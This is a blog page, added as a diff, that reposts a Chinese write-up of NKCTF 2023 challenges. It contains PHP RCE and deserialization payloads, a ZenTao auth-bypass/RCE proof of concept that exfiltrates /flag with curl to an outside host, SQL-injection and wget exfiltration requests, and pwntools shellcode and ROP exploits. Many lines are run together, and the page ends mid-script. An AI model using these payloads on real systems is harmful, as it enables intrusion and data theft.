@@ -1,0 +1,573 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2023 NKCTF WriteUp By EDISEC | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="NKCTF 2023：PHP 全角字符 + PDF-RCE + ZenTao CVE + APK + BMP stego">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 NKCTF WriteUp By EDISEC">
+<meta property="og:url" content="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Web/2023NKCTF-WriteUp_By_EDISEC/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="NKCTF 2023：PHP 全角字符 + PDF-RCE + ZenTao CVE + APK + BMP stego">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="NKCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Web/2023NKCTF-WriteUp_By_EDISEC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2023 NKCTF WriteUp By EDISEC',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2023 NKCTF WriteUp By EDISEC</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-31T16:00:00.000Z" title="发表于 2023-01-01 00:00:00">2023-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-31T16:00:00.000Z" title="更新于 2023-01-01 00:00:00">2023-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2023 NKCTF WriteUp By EDISEC"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/105824.html">https://www.ctfiot.com/105824.html</a><br>ID: 105824</p>
+</blockquote>
+<p>EDI</p>
+<p>JOIN US ▶▶▶</p>
+<p>招新</p>
+<p>EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。</p>
+<p>欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）有意向的师傅请联系邮箱<a href="mailto:&#114;&#111;&#x6f;&#116;&#x40;&#x65;&#x64;&#x69;&#115;&#x65;&#99;&#46;&#110;&#101;&#116;">&#114;&#111;&#x6f;&#116;&#x40;&#x65;&#x64;&#x69;&#115;&#x65;&#99;&#46;&#110;&#101;&#116;</a>、<a href="mailto:&#115;&#104;&#x69;&#x79;&#x69;&#64;&#101;&#x64;&#105;&#x73;&#101;&#x63;&#x2e;&#110;&#101;&#x74;">&#115;&#104;&#x69;&#x79;&#x69;&#64;&#101;&#x64;&#105;&#x73;&#101;&#x63;&#x2e;&#110;&#101;&#x74;</a>（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。</p>
+<p>点击蓝字 ·  关注我们</p>
+<p>00</p>
+<p>目录</p>
+<p>Webpagetest</p>
+<p>easy_pms</p>
+<p>easy_cms</p>
+<p>xiaopi</p>
+<p>baby_music</p>
+<p>easy_bmp</p>
+<p>blue</p>
+<p>THMaster</p>
+<p>三体</p>
+<p>easy_word</p>
+<p>first spam of rabbit year</p>
+<p>easy_rgb</p>
+<p>Crypto</p>
+<p>Re</p>
+<p>ez_baby_apk</p>
+<p>Pwn</p>
+<p>Blockchain</p>
+<p>SocialEngineering</p>
+<p>01</p>
+<p>Web</p>
+<p>1</p>
+<p>hard_php</p>
+<p>$<em>&#x3D;(０&#x2F;０).</em>;$<em>&#x3D;$</em>[‘’&#x3D;&#x3D;’$’];$<em>++;$__&#x3D;$</em>++;$<strong>&#x3D;$_++.$</strong>;$<em>++;$</em>++;$<em>&#x3D;’</em>‘.$_<em>.($</em>++).$<em>;$$</em><a href="$$_%5B_%5D">__</a>;</p>
+<p>NKCTF&#x3D;%24_%3D(%EF%BC%90%2F%EF%BC%90).<em>%3B%24</em>%3D%24_%5B’’%3D%3D’%24’%5D%3B%24_%2B%2B%3B%24__%3D%24_%2B%2B%3B%24__%3D%24_%2B%2B.%24__%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D’<em>‘.%24</em><em>.(%24</em>%2B%2B).%24_%3B%24%24_%5B__%5D(%24%24_%5B_%5D)%3B&amp;_<em>&#x3D;shell_exec&amp;</em>&#x3D;echo%20%60cat%20%2Fflag%60%3E%2Fvar%2Fwww%2Fhtml%2F3.txt</p>
+<p>访问3.txt拿flag</p>
+<p>2</p>
+<p>easy_php</p>
+<p>get请求:a&#x3D;s1502113478a&amp;b&#x3D;s1885207154a&amp;e&#x3D;114514.11&amp;NS[CTF.go&#x3D;apost请求:c&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd&#x3D;(“%08%02%08%08%05%0d”^”%7b%7b%7b%7c%60%60”)(“%03%01%08%00%00%06%0c%01%07”^”%60%60%7c%20%2f%60%60%60%60”);</p>
+<p>3</p>
+<p>baby_php</p>
+<?php
+class Welcome{ public $name; public $arg;}
+function waf($string){ if(preg_match('/f|l|a|g|*|?/i', $string)){ die("you are bad"); }}class Happy{ public $shell; public $cmd;}class Hell0{ public $func;}
+$ha=new Happy();$ha->shell="urldecode";$ha->cmd='system($_POST[1]);';
+$he=new Hell0();$he->func=$ha;
+$w=new Welcome();$w->name="welcome_to_NKCTF";$w->arg=$he;
+echo urlencode(serialize($w));
+
+4
+
+Webpagetest
+
+https://xz.aliyun.com/t/11798#toc-1
+
+5
+
+easy_pms
+
+https://github.com/webraybtl/zentaopms_poc
+
+# -*- coding: UTF-8 -*-# !/usr/bin/python
+'''权限绕过+RCE POC 伪静态传参版禅道系统 影响版本 安全版本开源版 17.4以下的未知版本<=version<=18.0.beta1 18.0.beta2旗舰版 3.4以下的未知版本<=version<=4.0.beta1 4.0.beta2企业版 7.4以下的未知版本<=version<=8.0.beta1 8.0.beta2'''import requests
+proxies = { #"http": "127.0.0.1:
+8080", #"https": "127.0.0.1:
+8080",}def check(url): # url="http://10.211.55.3:
+8008" url1 = url+'/misc-captcha-user.html' # url1 = url+'/index.php?m=misc&f=captcha&sessionVar=user'#非伪静态版本按照此格式传参 # url2 = url+'/index.php?m=block&f=printBlock&id=1&module=my'#可判断验证绕过的链接 url3 = url + 'repo-create.html' url4 = url + 'repo-edit-10000-10000.html' headers={ "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Accept-Language":"zh-CN,zh;q=0.9", "Cookie":"zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default", }
+ headers2 = { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Accept-Language": "zh-CN,zh;q=0.9", "Cookie": "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default", "Content-Type":"application/x-www-form-urlencoded", "X-Requested-With":"XMLHttpRequest", "Referer":
+url+"/repo-edit-1-0.html" }
+ data1 = 'product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=' data2 = 'SCM=Subversion&client=`curl -F "filename=@/flag" http://9p9p2b.ceye.io`' # curl -F "filename=@/home/test/file.tar.gz" http://9p9p2b.ceye.io s=requests.session() try: req1 = s.get(url1,timeout=5,verify=False,headers=headers) req3 = s.post(url3,data=data1,timeout=5,verify=False,headers=headers2) req4 = s.post(url4,data=data2,timeout=5,verify=False,headers=headers2) print(req4.text) return True 
+except Exception as e: print(e) return Falseif __name__ == '__main__': print(check("http://d8ce6925-25ed-4fd2-ad80-241401adfff8.node.yuzhian.com.cn:
+8000/"))
+
+6
+
+easy_cms
+
+参考：https://xz.aliyun.com/t/8056#toc-4 进行RCE
+
+7
+
+xiaopi
+
+参考B站视频：https://www.bilibili.com/video/BV1Yc411j7TP
+
+POST /service/app/account.php HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36X-Requested-With: XMLHttpRequestAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=357da909bf07d9414ed4ed0fConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 125
+type=login&username=admin';UPDATE ADMINS set PASSWORD = '67f43efc5701784db1504e4993d7e393';-- &password=admin&verifycode=mzxk
+
+POST /service/app/account.php HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36X-Requested-With: XMLHttpRequestAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=59896924bf07d94164875decConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 56
+type=login&username=admin&password=admin&verifycode=zjm6
+
+POST /service/app/tasks.php?type=save_shell HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnContent-Length: 111Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://10.9.57.100:
+9080Referer: http://10.9.57.100:
+9080/530BC3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=59896924bf07d94164875decConnection: close
+task_id=&title=test6&exec_cycle=5&week=1&day=3&hour=1&minute=1&shell=wget x.x.x.x:
+4041/`cat /flag|base64`
+
+POST /service/app/tasks.php?type=exec_task HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnContent-Length: 5Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://10.9.57.100:
+9080Referer: http://10.9.57.100:
+9080/530BC3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=59896924bf07d94164875decConnection: close
+tid=8
+
+NKCTF{23076c1f-15a3-4c80-9436-d5645845d7fd}
+
+02
+
+Misc
+
+1
+
+baby_music
+
+2
+
+easy_bmp
+
+https://blog.csdn.net/zip471642048/article/details/121998766
+
+3
+
+blue
+
+4
+
+THMaster
+
+0x00000FF/rensenware_force: rensenWare forcing tool (github.com)
+
+NKCTF{U_R_re411y_g00d_At_p14ying_t0h0u}
+
+5
+
+三体
+
+from PIL import Image
+def decode(im): width,height = im.size lst = [] for y in range(height): for x in range(width): red,green,blue = im.getpixel((x,y)) if(blue | green | red) == 0: break index = (green<<8) + blue lst.append(chr(index)) return ''.join(lst)
+if __name__=='__main__':
+ all_text = decode(Image.open("out.bmp","r")) with open ("decode.text","w",encoding = "utf-8") as f: f.write(all_text)
+
+6
+
+easy_word
+
+7
+
+first spam of rabbit year
+
+https://spammimic.com/decode.shtml
+
+8
+
+easy_rgb
+
+montage *.png -tile 30x6 -geometry +0+0 flag_tmp.pnggaps --image flag_tmp.png　 --size 125 --save#说明一下参数 30x6和125#-tile：设置每行每列的原始图片数量，30x6 表示拼图的宽30张 高6张，这个要结合gaps多尝试几种不同组合才能得到正确的尺寸。#--size: 这里每张图片为125像素
+
+with open("r.txt") as r: red=r.read()with open("g.txt") as g: green=g.read()with open("b.txt") as b: blue = b.read()str=""for i in range(0,148): str+=red[i] str+=green[i] str+=blue[i]print(str)
+
+IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+AES-12
+
+NKCTF{603fcdfc-652b-40e4-90cf-f27c2edc2d9f}
+
+03
+
+Crypto
+
+1
+
+baby_rsa
+
+e=65537n = 114101396033690088275999670914803472451228154227614098210572767821433470213124900655723605426526569384342101959232900145334500170690603208327913698128445002527020347955300595384752458477749198178791196660625870659540794807018881780680683388008090434114437818447523471527878292741702348454486217652394664664641N = 1159977299277711167607914893426674454199208605107323826176606074354449015203832606569051328721360397610665453513201486235549374869954501563523028914285006850687275382822302821825953121223999268058107278346499657597050468069712686559045712946025472616754027552629008516489090871415609098178522863027127254404804829735621706042266140637592206366042515190385496909533329383212542170504864473944657824502882014292528444918055958758310544435120502872883857209880723535754528096143707324179005292445100655695427777453144657819474805882956064292780031599790769618615908501966912635232746588639924772530057835864082951499028dP = 33967356791272818610254738927769774016289590226681637441101504040121743937150259930712897925893431093938385216227201268238374281750681609796883676743311872905933219290266120756315613501614208779063819499785817502677885240656957036398336462000771885589364702443157120609506628895933862241269347200444629283263
+# t=e*dP-1
+# for k in range(1,e):# if t%k==0:# P=(t//k)+1
+# if N%P==0:# print(P)
+P=37269067352457630263351774206178494913957088859822110344334922741582406663
+3576632750017778267445345566529934525770887732758255395539070275277220458844
+8929725998468789449650526538407798388258024733397295470464451746999991657489
+3996324149548980338301147983367163067556434434982470623587914250041142380667
+816331Q=N//P
+PR.<x>=Zmod(n)[]f=(x-P)*(x-Q)m=f.small_roots(X=2^300)print(m)
+m=152099310694956022622926857538598513541723670773227126074246760446874272165452073476477print(long_to_bytes(m))
+
+04
+
+Re
+
+1
+
+ez_baby_apk
+
+NKCTF{nI_k@i_sHi_zhu_j1an_il_Jie_RE_le}
+
+05
+
+Pwn
+
+1
+
+ezshellcode
+
+#!usr/bin/env python #coding=utf-8
+from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./pwn')DEBUG = 1if DEBUG: gdbOpen = 1 clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') p = process('./pwn')else: gdbOpen = 0 ip = 'node.yuzhian.com.cn' port = 38867 p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")
+
+debug("b *0x00000000004012F1")shellcode = p8(0x90) * 104 + asm(shellcraft.sh()) p.sendafter("in 5 min!n", shellcode)
+p.interactive()
+
+2
+
+a_story_of_a_pwner
+
+#!usr/bin/env python #coding=utf-8
+from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./pwn')DEBUG = 0if DEBUG: gdbOpen = 1 clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF("./libc.so.6") p = process('./pwn')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 33627 libc = ELF("./libc.so.6") p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")
+
+def choose(choice): p.sendlineafter(b"> n", str(choice).encode('ascii'))
+pop_rdi = 0x0000000000401573leave_ret = 0x000000000040139Edebug("b *0x000000000040139F")choose(4)p.recvuntil(b'0x')leak = int(p.recv(12), 16) - 0x84420log.info("libc_base==>0x%x" %leak)sys = leak + libc.sym['system']binsh = leak + next(libc.search(b'/bin/sh'))choose(1)p.sendafter(b'comment?n', p64(binsh))choose(2)p.sendafter(b'corment?n', p64(pop_rdi))choose(3)p.sendafter(b'corMenT?n', p64(sys))choose(4)payload = b'a'*0xa + p64(0x0000000000405098) + p64(leave_ret)p.sendafter(b'heart...n', payload)
+p.interactive()
+
+3
+
+ez_stack
+
+#!usr/bin/env python #coding=utf-8
